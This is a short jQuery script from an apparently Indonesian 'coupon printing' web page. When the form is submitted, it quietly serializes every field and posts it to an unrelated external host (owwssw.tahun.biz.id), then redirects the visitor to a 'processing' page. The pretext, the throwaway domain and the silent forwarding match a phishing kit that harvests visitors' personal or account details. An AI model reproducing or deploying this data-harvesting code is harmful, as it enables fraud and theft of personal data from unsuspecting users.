 
 
      $(document).ready(function(){
    $('#formdata').submit(function(e) {
    event.preventDefault();
    
document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";


 $.ajax({
 type: 'POST',
 url: 'https://owwssw.tahun.biz.id/7916/data.php',
 data: $(formdata).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            vibr(180);
            console.log('Complete')
   setTimeout(function(){
  window.location.href='proses.html'
 
    }, 3000);
        }
    });
 });
    return false;
});   
     
